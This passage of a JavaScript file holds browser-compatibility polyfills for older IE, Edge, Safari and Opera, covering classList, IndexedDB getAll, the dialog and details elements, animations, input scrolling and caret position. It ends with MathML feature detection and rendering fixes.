      if (event.keyCode === DOM_VK_RETURN) {
        if (input.getAttribute('data-disallow-enter') != null) {
          input.removeAttribute('data-disallow-enter');
          event.stopImmediatePropagation();
        }
      }
    }
  }, true);
}



//IE 11
if (!("innerHTML" in Element.prototype)) {
  Object.defineProperty(Element.prototype, 'innerHTML', {
    get: function () {
      'use strict';
      return undefined;//TODO:
    },
    set: function (value) {
      'use strict';
      console.log(value);
      var xml = document.createElement('div');
      xml.innerHTML = value;
      while (this.firstChild != null) {
        this.removeChild(this.firstChild);
      }
      while (xml.firstChild != null) {
        this.appendChild(xml.firstChild);
      }
    },
    enumerable: false,
    configurable: true
  });
}

// IE 11
//TODO: mrow.far
if (!('classList' in Element.prototype)) {
  (function () {
    'use strict';
    function ClassList(element) {
      this.element = element;
    }
    ClassList.prototype.toggle = function (className, force) {//TODO: force
      var classes = this.element.getAttribute('class') || '';
      if (force) {
        if ((' ' + classes + ' ').indexOf(' ' + className + ' ') === -1) {
          this.element.setAttribute('class', (classes !== '' ? classes + ' ' : '') + className);//TODO:!
        }
      } else {
        if ((' ' + classes + ' ').indexOf(' ' + className + ' ') !== -1) {
          this.element.setAttribute('class', (' ' + classes + ' ').split(' ' + className + ' ').join(' ').slice(1, -1));
        }
      }
    };
    //TODO: !
    Object.defineProperty(Element.prototype, 'classList', {
      get: function () {
        return new ClassList(this);
      },
      set: function (value) {
        throw new TypeError();
      },
      enumerable: false,
      configurable: true
    });
  }());
}


// TODO: Firefox bug, Edge bug
// Firefox does not scroll while dragover for <input>
// IE does not scorll while dragover for <input>
if (true) {
  'use strict';
  var lastScrollLeft = 0;
  document.addEventListener('dragover', function (event) {
    var input = event.target;//document.elementFromPoint(event.clientX, event.clientY);
    if (input.tagName.toLowerCase() === 'input') {
      if (lastScrollLeft === input.scrollLeft) { // The skip if the web browser has the support of this feature
        var rect = input.getBoundingClientRect();
        var distanceToLeftEdge = event.clientX - rect.left;
        var distanceToRightEdge = input.clientWidth - (event.clientX - rect.left);
        var dx = distanceToLeftEdge < 9 ? -6 : (distanceToRightEdge < 9 ? +6 : 0);
        dx = Math.max(dx, -input.scrollLeft);
        //dx = Math.min(dx, input.scrollWidth - input.clientWidth);
        if (dx !== 0) {
          //input.scrollBy(dx, 0);
          input.scrollLeft = input.scrollLeft + dx;// input.scrollBy() is not supported in Edge 18
        }
      }
      lastScrollLeft = input.scrollLeft;
    }
  }, false);
}

/*global window*/

// Edge 18 - ?
// Safari < 10.1
if (window.IDBObjectStore != undefined &&
    window.IDBObjectStore.prototype != undefined &&
    window.IDBObjectStore.prototype.getAll == undefined) {
  window.IDBObjectStore.prototype.getAll = function (query, count) {
    "use strict";
    var request = {
      onsuccess: undefined
    };
    var result = [];
    var cursorRequest = query == undefined ? this.openCursor() : this.openCursor(query);
    cursorRequest.onsuccess = function (event) {
      var cursor = event.target.result;
      if (cursor != undefined) {
        result.push(cursor.value);
        cursor["continue"]();
      } else {
        request.onsuccess({target: {result: count == undefined ? result : result.slice(0, count)}});
      }
    };
    return request;
  };
}
if (window.IDBObjectStore != undefined &&
    window.IDBObjectStore.prototype != undefined &&
    window.IDBObjectStore.prototype.openKeyCursor == undefined) {
  window.IDBObjectStore.prototype.openKeyCursor = function (range, direction) {
    "use strict";
    // Edge 17 throws an exception for "store.openCursor(undefined)"
    return range == undefined && direction == undefined ? this.openCursor() : (direction == undefined ? this.openCursor(range) : this.openCursor(range, direction));
  };
}
if (window.IDBObjectStore != undefined &&
    window.IDBObjectStore.prototype != undefined &&
    window.IDBObjectStore.prototype.getAllKeys == undefined) {
  window.IDBObjectStore.prototype.getAllKeys = function (query, count) {
    "use strict";
    var request = {
      onsuccess: undefined
    };
    var result = [];
    var cursorRequest = query == undefined ? this.openKeyCursor() : this.openKeyCursor(query);
    cursorRequest.onsuccess = function (event) {
      var cursor = event.target.result;
      if (cursor != undefined) {
        result.push(cursor.key);
        cursor["continue"]();
      } else {
        request.onsuccess({target: {result: count == undefined ? result : result.slice(0, count)}});
      }
    };
    return request;
  };
}

/*global document, window, Element */

(function () {
  "use strict";

  var hasCompositeAddSupport = function () {
    var ok = false;
    if (document.body != undefined) {
      var tmp = document.createElement("div");
      tmp.style.position = "absolute";
      tmp.style.overflow = "hidden";
      tmp.style.width = "1px";
      tmp.style.height = "1px";
      document.body.appendChild(tmp);
      tmp.style.opacity = "0";
      try {
        for (var i = 0; i < 2; i += 1) {
          tmp.animate([
            {opacity: "0.25"},
            {opacity: "0.50"}
          ], {
            duration: 1000,
            composite: "add"
          });
        }
      } catch (error) {
        // an error in Chrome < ?
        window.console.log(error);
      }
      ok = window.getComputedStyle(tmp, undefined).opacity === "0.5";
      document.body.removeChild(tmp);
    }
    return ok;
  };

  var nativeAnimate = Element.prototype.animate;
  var nativeAnimations = [];
  var setAnimationStyles = function (element, keyframes, options) {
    var k = 0;
    var oldAnimation = undefined;
    for (var i = 0; i < nativeAnimations.length; i += 1) {
      var x = nativeAnimations[i];
      if (x.element === element) {
        oldAnimation = x.animation;
      } else {
        nativeAnimations[k] = x;
        k += 1;
      }
    }
    while (nativeAnimations.length > k) {
      nativeAnimations.pop();
    }
    if (keyframes != undefined) {
      var newAnimation = nativeAnimate.call(element, keyframes, options);
      nativeAnimations.push({
        element: element,
        animation: newAnimation
      });
    }
    if (oldAnimation != undefined) {
      //Note: cancel is needed to remove the animation from the list of element's animations (especially, if `fill` is "both")
      oldAnimation.cancel();
    }
  };

  var cubicBezier = function (a, b, t) {
    return 3 * a * (1 - t) * (1 - t) * t + 3 * b * (1 - t) * t * t + t * t * t;
  };

  var cubic = function (x, error, a, b, c, d) {
    var start = 0;
    var end = 1;
    while (end - start > error) {
      var middle = (start + end) / 2;
      var e = cubicBezier(a, c, middle);
      if (e < x) {
        start = middle;
      } else {
        end = middle;
      }
    }
    return cubicBezier(b, d, start);
  };

  var easeInOut = function (x, error) {
    return cubic(x, error, 0.42, 0, 0.58, 1);
  };

  var animations = [];

  var interpolateValues = function (a, b, p) {
    return (1 - p) * a + p * b;
  };

  var addValues = function (a, b) {
    return a + b;
  };

  function Transform(name, arg) {
    this.name = name;
    this.arg = arg;
  }

  Transform.prototype.toString = function () {
    return this.name + "(" + this.arg.toString() + (this.name !== "scale" ? "px" : "") + ")";
  };

  Transform.parseTransform = function (transform) {
    var match = /^\s*([a-zA-Z]+)\(([^\),]+)\)\s*$/.exec(transform);
    if (match == undefined) {
      throw new Error();
    }
    var name = match[1];
    var arg = Number.parseFloat(match[2]);
    return new Transform(name, arg);
  };

  function Keyframe(opacity, transform) {
    this.opacity = opacity;
    this.transform = transform;
  }

  Keyframe.parseKeyframe = function (style) {
    var opacity = style.opacity == undefined || style.opacity === "" ? undefined : Number.parseFloat(style.opacity);
    var transform = style.transform == undefined || style.transform === "" ? undefined : Transform.parseTransform(style.transform);
    return new Keyframe(opacity, transform);
  };

  Keyframe.prototype.interpolate = function (keyframe, p) {
    var opacity = undefined;
    if (this.opacity != undefined || keyframe.opacity != undefined) {
      opacity = interpolateValues(this.opacity != undefined ? this.opacity : 1, keyframe.opacity != undefined ? keyframe.opacity : 1, p);
    }
    var transform = undefined;
    if (this.transform != undefined || keyframe.transform != undefined) {
      if (this.transform == undefined && keyframe.transform == undefined && this.transform.name !== keyframe.transform.name) {
        throw new Error();
      }
      var name = this.transform != undefined ? this.transform.name : keyframe.transform.name;
      transform = new Transform(name, interpolateValues(this.transform != undefined ? this.transform.arg : (name === "scale" ? 1 : 0), keyframe.transform != undefined ? keyframe.transform.arg : (name === "scale" ? 1 : 0), p));
    }
    return new Keyframe(opacity, transform);
  };

  Keyframe.prototype.add = function (keyframe, composite) {
    var opacity = keyframe.opacity == undefined ? this.opacity : (this.opacity == undefined || composite !== "add" ? keyframe.opacity : addValues(this.opacity, keyframe.opacity));
    var transform = keyframe.transform == undefined ? this.transform : (this.transform == undefined || composite !== "add" ? keyframe.transform : new Transform(this.transform.name, this.transform.name === "scale" ? this.transform.arg * keyframe.transform.arg : addValues(this.transform.arg, keyframe.transform.arg)));
    return new Keyframe(opacity, transform);
  };

  Keyframe.prototype.toJSON = function () {
    // no way to use undefined (Chrome) or "" (Firefox)
    if (this.opacity == undefined && this.transform != undefined) {
      return {
        transform: this.transform != undefined ? this.transform.toString() : ""
      };
    }
    if (this.opacity != undefined && this.transform == undefined) {
      return {
        opacity: this.opacity != undefined ? this.opacity.toString() : ""
      };
    }
    if (this.opacity != undefined && this.transform != undefined) {
      return {
        opacity: this.opacity != undefined ? this.opacity.toString() : "",
        transform: this.transform != undefined ? this.transform.toString() : ""
      };
    }
    return {};
  };

  var generateKeyframes = function (element, startTime, endTime) {
    var style = Keyframe.parseKeyframe(element.style);
    var keyframes = [];
    for (var time = startTime; time < endTime; time += 1000 / 60) {
      var value = style;
      for (var i = 0; i < animations.length; i += 1) {
        var a = animations[i];
        if (a.element === element) {
          var timeFraction = (time - a.startTime) / a.duration;
          if (timeFraction < 0) {
            timeFraction = 0;
          }
          if (timeFraction > 1) {
            timeFraction = 1;
          }
          var p = easeInOut(timeFraction, 1000 / 60 / a.duration / 32);
          var frame0 = value.add(a.keyframes[0], a.composite);
          var frame1 = value.add(a.keyframes[1], a.composite);
          value = frame0.interpolate(frame1, p);
        }
      }
      keyframes.push(value.toJSON());
    }
    return keyframes;
  };

  var startTime = 0;

  if (nativeAnimate != undefined && !hasCompositeAddSupport()) {
    Element.prototype.animate = function (frames, keyframeEffectOptions) {
      if (startTime === 0) {
        startTime = Date.now();
        window.setTimeout(function () {
          startTime = 0;
        }, 0);
      }
      var now = startTime;
      var keyframes = [];
      for (var j = 0; j < frames.length; j += 1) {
        keyframes.push(Keyframe.parseKeyframe(frames[j]));
      }
      var element = this;
      var animation = {
        element: element,
        keyframes: keyframes,
        duration: keyframeEffectOptions.duration,
        composite: keyframeEffectOptions.composite,
        startTime: now
      };
      animations.push(animation);
      var endTime = 0;
      for (var i = 0; i < animations.length; i += 1) {
        if (animations[i].element === element) {
          var animationEndTime = animations[i].startTime + animations[i].duration;
          if (endTime < animationEndTime) {
            endTime = animationEndTime;
          }
        }
      }
      var animationKeyframes = generateKeyframes(element, now, endTime);
      setAnimationStyles(element, animationKeyframes, {duration: endTime - now, easing: "linear"}); // fill: "both" - ?
      window.setTimeout(function () {
        var k = 0;
        var active = 0;
        for (var i = 0; i < animations.length; i += 1) {
          if (animations[i] !== animation) {
            if (animations[i].element === element) {
              active += 1;
            }
            animations[k] = animations[i];
            k += 1;
          }
        }
        animations.length = k;
        if (active === 0) {
          setAnimationStyles(element, undefined, undefined);
        }
      }, animation.duration);
      return animation;
    };
  }

}(this));

/*global document, window, Element */

(function () {
  "use strict";

  function Inert() {
  }
  Inert.observers = [];
  Inert.dialogs = [];
  Inert.f = function (tabIndex) {
    return -42 - tabIndex;
  };
  Inert.toggleInert = function (node, dialog, value) {
    if (!dialog.contains(node)) {
      if ((value && node.tabIndex >= 0) || (!value && node.tabIndex <= Inert.f(0))) {
        node.tabIndex = Inert.f(node.tabIndex);
      }
      var c = node.firstElementChild;
      while (c != undefined) {
        Inert.toggleInert(c, dialog, value);
        c = c.nextElementSibling;
      }
    }
  };
  Inert.push = function (dialog) {
    Inert.toggleInert(document.documentElement, dialog, true);
    if (window.MutationObserver != undefined) {
      var observer = new window.MutationObserver(function (mutations) {
        for (var i = 0; i < mutations.length; i += 1) {
          var mutation = mutations[i];
          var addedNodes = mutation.addedNodes;
          for (var j = 0; j < addedNodes.length; j += 1) {
            Inert.toggleInert(addedNodes[j], dialog, true);
          }
          var removedNodes = mutation.removedNodes;
          for (var k = 0; k < removedNodes.length; k += 1) {
            Inert.toggleInert(removedNodes[k], dialog, false);
          }
        }
      });
      observer.observe(document.documentElement, {
        childList: true,
        subtree: true
      });
      Inert.observers.push(observer);
    }
    Inert.dialogs.push(dialog);
  };
  Inert.pop = function () {
    var dialog = Inert.dialogs.pop();
    if (window.MutationObserver != undefined) {
      var observer = Inert.observers.pop();
      observer.disconnect();
    }
    Inert.toggleInert(document.documentElement, dialog, false);
  };

  var setFocus = function (dialog) {
    var autofocus = dialog.querySelector("[autofocus]");
    autofocus.focus();
  };

  var show = function () {
    if (this.getAttribute("open") == undefined) {
      this.setAttribute("open", "open");
      setFocus(this);
    }
  };

  var showModal = function () {
    if (this.getAttribute("open") == undefined) {
      this.setAttribute("data-modal", "data-modal");
      this.setAttribute("open", "open");
      Inert.push(this);
      setFocus(this);
    }
  };

  var close = function (returnValue) {
    if (this.getAttribute("open") != undefined) {
      if (this.getAttribute("data-modal") != undefined) {
        this.removeAttribute("data-modal");
        Inert.pop();
      }
      this.removeAttribute("open");
      this.returnValue = returnValue;
      var event = document.createEvent("Event");
      event.initEvent("close", false, false);
      this.dispatchEvent(event);
    }
  };

  var dialog = document.createElement('dialog');
  if ((dialog.show == undefined || dialog.showModal == undefined || dialog.close == undefined) && Element.prototype.initDialog == null) {
    Element.prototype.initDialog = function () {
      var dialog = this;
      dialog.setAttribute("role", "dialog");
      dialog.show = show;
      dialog.showModal = showModal;
      dialog.close = close;
      dialog.returnValue = undefined;
      dialog.addEventListener("keydown", function (event) {
        var DOM_VK_ESCAPE = 27;
        if (event.keyCode === DOM_VK_ESCAPE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
          event.preventDefault();
          var cancelEvent = document.createEvent("Event");
          cancelEvent.initEvent("cancel", false, true);
          if (this.dispatchEvent(cancelEvent)) {
            this.close(undefined);
          }
        }
      }, false);
      dialog.addEventListener("submit", function (event) {
        event.preventDefault();
        this.close(event.target.getAttribute("value"));
      }, false);
    };
  }

}());

/*global document, Element*/

(function () {
  "use strict";

  var details = document.createElement('details');
  var summary = document.createElement('summary');
  details.appendChild(summary);
  if ((!("open" in details) || !("ontoggle" in details) || summary.tabIndex === -1) && Element.prototype.initDetails == null) {
    Element.prototype.initDetails = function (summary) {
      var details = this;
      //var summary = details.firstElementChild;
      if (summary.tagName.toLowerCase() !== 'summary') {
        throw new RangeError("Unexpected " + summary.tagName.toLowerCase());
      }
      details.setAttribute("role", "group");
      summary.setAttribute("aria-expanded", "false");// Note: on <summary>
      summary.setAttribute("role", "button");
      summary.tabIndex = 0;
      summary.addEventListener("click", function (event) {
        var summary = this;
        var details = summary.parentNode;
        event.preventDefault();
        var isOpen = details.getAttribute("open") != undefined;
        if (!isOpen) {
          summary.setAttribute("aria-expanded", "true");// Note: on <summary>
          details.setAttribute("open", "open");
        } else {
          details.setAttribute("aria-expanded", "false");
          details.removeAttribute("open");
        }
        summary.focus();
        var e = document.createEvent("Event");
        e.initEvent("toggle", false, false);
        details.dispatchEvent(e);
      }, false);
      // role="button" => click should be fired with SPACE key too
      summary.addEventListener("keydown", function (event) {
        var DOM_VK_SPACE = 32;
        if (event.keyCode === DOM_VK_SPACE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
          event.preventDefault(); // scrolling
        }
        var DOM_VK_RETURN = 13;
        if (event.keyCode === DOM_VK_RETURN && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
          event.preventDefault();
          this.click();
        }
      }, false);
      summary.addEventListener("keyup", function (event) {
        var DOM_VK_SPACE = 32;
        if (event.keyCode === DOM_VK_SPACE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
          event.preventDefault();
          this.click();
        }
      }, false);
    };
  }

}());

/*global document, window, Element, HTMLInputElement */

(function () {
  "use strict";

  // a bug in Chrome on Windows 47 - 67 - ?
  // https://bugs.chromium.org/p/chromium/issues/detail?id=652102
  if (Object.getOwnPropertyDescriptor != undefined) {
    var lastDevicePixelRatio = 0;
    var lastScrollLeftFix = 1;
    var originalScrollLeft = undefined;
    try {
      originalScrollLeft = Object.getOwnPropertyDescriptor(Element.prototype, "scrollLeft");
    } catch (error) {
      // NS_ERROR_XPC_BAD_CONVERT_JS: Could not convert JavaScript argument in Firefox 17
      window.console.log(error);
    }
    if (originalScrollLeft != undefined && originalScrollLeft.get != undefined && originalScrollLeft.set != undefined) { // Safari < 10, Opera 12
      Object.defineProperty(HTMLInputElement.prototype, "scrollLeft", {
        get: function () {
          if (this.tagName.toLowerCase() !== 'input') {
            return originalScrollLeft.get.call(this);
          }
          if (lastDevicePixelRatio !== window.devicePixelRatio) {
            lastDevicePixelRatio = window.devicePixelRatio;
            var input = document.createElement("input");
            document.body.appendChild(input);
            input.style.width = "1px";
            input.style.overflow = "hidden";
            input.value = "xxxxxxxxxxxxxxx";
            originalScrollLeft.set.call(input, 16383);
            var s = originalScrollLeft.get.call(input);
            if (s === 0) { // IE - Edge
              lastScrollLeftFix = 1;
            } else {
              lastScrollLeftFix = (input.scrollWidth - input.clientWidth) / s;
              if (lastScrollLeftFix === 0) { // Edge/18.18362 (input.scrollWidth === input.clientWidht)
                lastScrollLeftFix = 1;
              }
              if ((1 - lastScrollLeftFix) * (1 - lastScrollLeftFix) < 0.05 * 0.05) {
                lastScrollLeftFix = 1;
              }
            }
            document.body.removeChild(input);
          }
          // lastScrollLeftFix equals window.devicePixelRatio in Chrome 49 - 53
          return lastScrollLeftFix * originalScrollLeft.get.call(this);
        },
        set: function (value) {
          originalScrollLeft.set.call(this, value);
        },
        enumerable: false,
        configurable: true
      });
    }
  }

}());

// Firefox < 20, Chrome, Edge, Opera, Safari
if (document.caretPositionFromPoint == undefined) {
  document.caretPositionFromPoint = function (x, y) {
    "use strict";
    var element = document.elementFromPoint(x, y);
    if (element.tagName.toLowerCase() !== 'input' &&
        element.tagName.toLowerCase() !== 'textarea') {
      var caretRange = document.caretRangeFromPoint(x, y);
      return {
        offsetNode: caretRange.startContainer,
        offset: caretRange.startOffset
      };
    }
    var input = element;
    var inputStyle = window.getComputedStyle(input, undefined);

    var scrollLeft = input.scrollLeft;
    var scrollTop = input.scrollTop;

    var inputRect = input.getBoundingClientRect();

    var value = input.value.replace(/\r\n/g, "\n") + "\n"; // IE - \r\n
    var div = document.createElement("div");
    div.textContent = value;
    div.style.position = "absolute";
    div.style.display = "inline-block";

    div.style.margin = "0px";
    div.style.border = "0px solid transparent";

    div.style.paddingLeft = inputStyle.paddingLeft;
    div.style.paddingRight = inputStyle.paddingRight;
    div.style.paddingTop = inputStyle.paddingTop;
    div.style.paddingBottom = inputStyle.paddingBottom;

    div.style.left = (inputRect.left + window.pageXOffset + input.clientLeft).toString() + "px";
    div.style.top = (inputRect.top + window.pageYOffset + input.clientTop).toString() + "px";
    div.style.width = input.clientWidth.toString() + "px";
    div.style.height = input.clientHeight.toString() + "px";

    if ("boxSizing" in div.style) {
      div.style.boxSizing = "border-box";
    }
    if ("MozBoxSizing" in div.style) {
      div.style.MozBoxSizing = "border-box";
    }
    if ("webkitBoxSizing" in div.style) {
      div.style.webkitBoxSizing = "border-box";
    }

    div.style.whiteSpace = input.tagName.toLowerCase() === 'input' ? 'nowrap' : 'pre';
    div.style.wordWrap = inputStyle.wordWrap;

    // Firefox does not like font
    div.style.fontSize = inputStyle.fontSize;
    div.style.fontFamily = inputStyle.fontFamily;
    div.style.overflow = "hidden";
    div.style.visibility = "visible"; // Opera 12 needs visible
    div.style.zIndex = "100000";//?

    document.body.appendChild(div);
    div.scrollLeft = scrollLeft;
    div.scrollTop = scrollTop;
    var range = document.caretRangeFromPoint(x, y);
    var offset = range.startOffset;
    document.body.removeChild(div);

    return {
      offsetNode: input,
      offset: offset
    };
  };
}

// IE, Edge, Firefox, Opera
if (Element.prototype.scrollIntoViewIfNeeded == undefined) {
  Element.prototype.scrollIntoViewIfNeeded = function () {
    "use strict";
    // `centerIfNeeded` is not implemented
    var rect = this.getBoundingClientRect();
    if (rect.left < 0 || document.documentElement.clientWidth < rect.right ||
        rect.top < 0 || document.documentElement.clientHeight < rect.bottom) {
      this.scrollIntoView(document.documentElement.clientHeight < rect.bottom - rect.top || rect.top < 0);
    }
  };
}


/*global window, document */

(function () {
  // Frédéric Wang - https://github.com/fred-wang/mathml.css/blob/master/mspace.js
  /* This Source Code Form is subject to the terms of the Mozilla Public
   * License, v. 2.0. If a copy of the MPL was not distributed with this
   * file, You can obtain one at http://mozilla.org/MPL/2.0/. */
   /*global document, Node*/
  "use strict";

  // layout work (?)
  var getMathMLSupport = function (tmp) {
    var table = "<mtable><mtr><mtd><mn>1</mn></mtd><mtd><mn>2</mn></mtd><mtd><mn>3</mn></mtd><mtd><mn>4</mn></mtd></mtr></mtable>";
    var table2 = table.replace(/<\/mtd><mtd>/g, "</mtd></mtr><mtr><mtd>");
    var table3 = table.replace(/<mtable>/g, "<mtable columnspacing=\"0em\">");
    var table4 = table.replace(/<mtable>/g, "<mtable columnlines=\"none solid none\">");
    var table5 = table.replace(/<mn>1<\/mn>/g, "<mpadded width=\"+0.8em\" lspace=\"+0.4em\"><mn>1</mn></mpadded>");
    var table6 = table.replace(/<mn>1<\/mn>/g, "<menclose notation=\"circle\"><mn>1</mn></menclose>");
    var table7 = table2.replace(/<mtable>/g, "<mtable rowspacing=\"0ex\">");
    var lspaceRspaceText = "<mrow><mi>x</mi><mo lspace=\"0em\" rspace=\"0em\">&it;</mo><mi>y</mi></mrow>" +
                           "<mrow><mi>x</mi><mo lspace=\"1em\" rspace=\"1em\">&it;</mo><mi>y</mi></mrow>";
    var msupMsubTest = "<msup><mrow><mtable><mtr><mtd><mn>1</mn></mtd></mtr><mtr><mtd><mn>2</mn></mtd></mtr></mtable></mrow><mrow><mn>2</mn></mrow></msup>" +
                       "<msup><mrow><mtable><mtr><mtd><mn>1</mn></mtd></mtr><mtr><mtd><mn>2</mn></mtd></mtr><mtr><mtd><mn>3</mn></mtd></mtr></mtable></mrow><mrow><mn>2</mn></mrow></msup>";
    tmp.innerHTML = "<math>" + table + table2 + table3 + table4 + table5 + table6 + table7 + lspaceRspaceText + msupMsubTest + "</math>";
    var t = tmp.firstElementChild.firstElementChild;
    var t2 = t.nextElementSibling;
    var t3 = t2.nextElementSibling;
    var t4 = t3.nextElementSibling;
    var t5 = t4.nextElementSibling;
    var t6 = t5.nextElementSibling;
    var t7 = t6.nextElementSibling;
    var t8 = t7.nextElementSibling;
    var t9 = t8.nextElementSibling;
    var t10 = t9.nextElementSibling;
    var t11 = t10.nextElementSibling;
    var math = t.getBoundingClientRect().width > t2.getBoundingClientRect().width;
    var columnspacing = t.getBoundingClientRect().width > t3.getBoundingClientRect().width;
    var columnlines = t.getBoundingClientRect().width < t4.getBoundingClientRect().width;
    var mpadded = t.getBoundingClientRect().width < t5.getBoundingClientRect().width;
    var menclose = t.getBoundingClientRect().width + t.getBoundingClientRect().height < t6.getBoundingClientRect().width + t6.getBoundingClientRect().height;
    var rowspacing = t2.getBoundingClientRect().height > t7.getBoundingClientRect().height;
    var lspaceRspace = t9.getBoundingClientRect().width > t8.getBoundingClientRect().width;
    var msupMsub = t11.lastElementChild.getBoundingClientRect().top < t10.lastElementChild.getBoundingClientRect().top;
    var tabIndex = t.tabIndex != null; //TODO: ?
    var draggable = t.draggable != null;
    return (math ? "" : "no-math ") +
           (columnspacing ? "" : "no-columnspacing ") +
           (mpadded ? "" : "no-mpadded ") +
           (columnlines ? "" : "no-columnlines ") +
           (menclose ? "" : "no-menclose ") +
           (rowspacing ? "" : "no-rowspacing ") +
           (lspaceRspace ? "" : "no-lspace-rspace ") +
           (msupMsub ? "" : "no-msup-msub ") +
           (tabIndex ? "" : "no-tabindex ") +
           (draggable ? "" : "no-draggable ");
  };

  var queue = function (f) {
    // why not zero - ?
    window.setTimeout(f, 1);
  };

  document.addEventListener("DOMContentLoaded", function (event) {
    if (window.opera != undefined) {
      document.body.classList.toggle("css-profile", true);
      //document.body.classList.toggle("no-draggable", true);
    }
    //if (window.XDomainRequest == undefined && !("draggable" in document.documentElement) && !()) {
    //  document.body.classList.toggle("no-draggable", true);
    //}

    var tmp = document.createElement("div");
    tmp.style.position = "absolute";
    tmp.style.zIndex = "-1";
    tmp.style.clip = "rect(0 0 0 0)";
    tmp.style.whiteSpace = "nowrap";
    tmp.style.width = "0px";
    tmp.style.height = "0px";
    tmp.style.overflow = "hidden";
    document.body.appendChild(tmp);
    //tmp.innerHTML = "<math><mrow mathcolor=\"#FF0000\"><mn>1</mn></mrow></math>";
    //var ok = window.getComputedStyle(tmp.firstElementChild.firstElementChild, undefined).color.indexOf("255") !== -1;
    //var c = ok ? getMathMLSupport(tmp) : "math ";
    // Mi Browser in Night Mode changes color to rgba(255, 255, 255, 0.5)
    //TODO: fix math -> no-math
    var c = getMathMLSupport(tmp).replace(/^no\-math[\s\S]+/g, "math ");
    document.body.removeChild(tmp);
    if (c !== "") {
      var classes = c.replace(/^\s+|\s+$/g, "").split(" ");
      for (var i = 0; i < classes.length; i += 1) {
        document.body.classList.toggle(classes[i], true);
      }
    }
    // I want to have focusable and draggable element, menclose[href="#"] can be used, but I need to prevent the navigation.
    if (c !== "math " || window.opera != undefined) {
      // Opera supports MathML links too with some special CSS
      var preventNavigation = function (event) {
        if (event.button === 0 || event.button === 1) {
          var target = event.target;
          while (target != undefined && (target.nodeType !== Node.ELEMENT_NODE || target.getAttribute("href") == undefined)) {
            target = target.parentNode;
          }
          if (target != undefined && target.getAttribute("href") === "#") {
            var tagName = target.tagName.toLowerCase();
            if (tagName === 'mrow' || tagName === 'mtd' || tagName === 'menclose') {
              event.preventDefault();
            }
          }
        }
      };
      document.addEventListener("click", preventNavigation, false);
      document.addEventListener("auxclick", preventNavigation, false);
    }

    if (c.indexOf('no-lspace-rspace ') !== -1 || c === 'math ') { // no lspace+rspace support based on The operator dictionary
      document.addEventListener('animationstart', function (event) {
        var target = event.target;
        if (target.tagName.toLowerCase() === 'mo' && target.getAttribute('form') !== 'infix') {
          var c = target.textContent;
          if (c === '\u2061' || c === '\u2062' || c === '\u2063' ||
              c === '(' || c === ')' || c === '|' || c === '{' || c === '}' ||
              (target.nextElementSibling == null && target.previousElementSibling != null) ||
              (target.previousElementSibling == null && target.nextElementSibling != null)) {
            queue(function () {
              target.setAttribute('lspace', '0em');
              target.setAttribute('rspace', '0em');
            });
          }
        }
      }, false);
    }
    if (c.indexOf('no-columnlines ') !== -1 || c === 'math ') {
      document.addEventListener('animationstart', function (event) {
        var table = event.target;
        if (table.tagName.toLowerCase() === 'mtable') {
          var columnlines = (table.getAttribute('columnlines') || '').replace(/^\s+|\s+$/g, '').split(/\s+/g);
          queue(function () {
            for (var row = table.firstElementChild; row != null; row = row.nextElementSibling) {
              for (var cell = row.firstElementChild, index = 0; cell != null; cell = cell.nextElementSibling, index += 1) {
                if (index > 0) {
                  var linestyle = columnlines[Math.min(index - 1, columnlines.length - 1)];
                  if (linestyle === 'solid') {
                    cell.setAttribute('class', 'solidBorderLeft');
                  }
                }
              }
            }
          });
        }
      }, false);
    }
    if (c === 'math ') {
      document.addEventListener('animationstart', function (event) {
        var target = event.target;
        if (target.tagName.toLowerCase() === 'mo') {
          var c = target.textContent;
          if (c === '(' || c === ')' || c === '|' || c === '{' || c === '}') {
            // <mrow><mo>(</mo><mrow>...</mrow><mo>)</mo></mrow>
            queue(function () {
              target.parentNode.setAttribute('class', 'fences-container');
            });
          }
        }
      }, false);
      var stretchMO = function (target) {
        var c = target.textContent;
        if (c === '(' || c === ')' || c === '|' || c === '{' || c === '}') {
          var fontSize = Number.parseFloat(window.getComputedStyle(target, null).fontSize);

          var height = target.parentNode.getBoundingClientRect().height;
          var scaleY = height / fontSize;
          var scaleX = Math.sqrt(Math.sqrt(scaleY));

          if (scaleY > 1.05) {
            queue(function () {
              var prefix = 'transform' in document.documentElement.style ? '' : ('OTransform' in document.documentElement.style ? '-o-' : ('msTransform' in document.documentElement.style ? '-ms-' : ('MozTransform' in document.documentElement.style ? '-moz-' : '-webkit-')));
              var style = prefix + 'transform: ' + 'scale(' + scaleX + ', ' + scaleY + ')';
              target.setAttribute('style', style);
              if (window.opera != null) {
                // Opera 12.18 needs namespace to apply styles
                target.setAttributeNS('http://www.w3.org/1999/xhtml', 'style', style);
              }
            });
          }
        }
      };
      document.addEventListener('animationstart', function (event) {
        var target = event.target;
        if (target.tagName.toLowerCase() === 'mo') {
          stretchMO(target);
        }
      }, false);
      window.addEventListener('resize', function (event) {
        var elements = document.getElementsByTagName('mo');
        for (var i = 0; i < elements.length; i += 1) {
          stretchMO(elements[i]);
        }
      }, false);
    }
    if (c.indexOf('no-draggable ') !== -1 || c === 'math ') {
      if (!('webkitUserDrag' in document.documentElement.style)) {
        document.addEventListener('animationstart', function (event) {
          var target = event.target;
          if (target.tagName.toLowerCase() === 'menclose' && target.getAttribute('draggable') != null) {
            queue(function () {
              target.setAttribute('href', '#');
            });
          }
        }, false);
      }
    }
    if (c.indexOf('no-tabindex ') !== -1 || c === 'math ') {
      document.addEventListener('animationstart', function (event) {
        var target = event.target;
        if (target.tagName.toLowerCase() === 'menclose' && target.getAttribute('tabindex') != null) {
          queue(function () {
            target.setAttribute('href', '#');
          });
        }
      }, false);
    }
    if (c === 'math ') {
      var getImageData = function (fontSize, font, character) {
        var canvas = document.createElement('canvas');
        canvas.width = fontSize;
        canvas.height = fontSize;

        var ctx = canvas.getContext('2d');
        ctx.font = font;
        ctx.textBaseline = 'top';
        ctx.fillStyle = 'white';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = 'black';
        ctx.fillText(character, 0, 0);

        return ctx.getImageData(0, 0, canvas.width, canvas.height).data;
      };
      var isCharacterSupported = function (character) {
        // https://stackoverflow.com/questions/22475157/is-there-any-unicode-character-whos-glyph-is-missing-in-all-fonts/22636426#22636426
        // https://stackoverflow.com/questions/23876361/codepoint-of-the-missing-glyph-box
        var MISSED_GLYPH = '\uF8FF';
